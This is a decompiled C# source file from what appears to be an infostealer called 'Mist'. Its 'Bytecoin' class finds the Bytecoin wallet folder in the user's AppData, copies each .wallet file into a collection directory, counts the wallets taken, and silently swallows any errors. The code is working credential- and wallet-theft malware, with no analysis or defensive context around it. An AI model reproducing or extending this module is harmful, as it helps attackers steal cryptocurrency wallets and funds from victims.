using System;
using System.IO;

namespace Mist
{
	// Token: 0x02000067 RID: 103
	internal class Bytecoin
	{
		// Token: 0x06000288 RID: 648 RVA: 0x000124F0 File Offset: 0x000106F0
		public static void BCNcoinStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Bytecoin.bytecoinDir))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Bytecoin.bytecoinDir).GetFiles())
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\Bytecoin\\");
						if (fileInfo.Extension.Equals(".wallet"))
						{
							fileInfo.CopyTo(directorypath + "\\Bytecoin\\" + fileInfo.Name);
						}
					}
					Bytecoin.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400015B RID: 347
		public static int count = 0;

		// Token: 0x0400015C RID: 348
		public static string bytecoinDir = Help.AppDate + "\\bytecoin\\";
	}
}
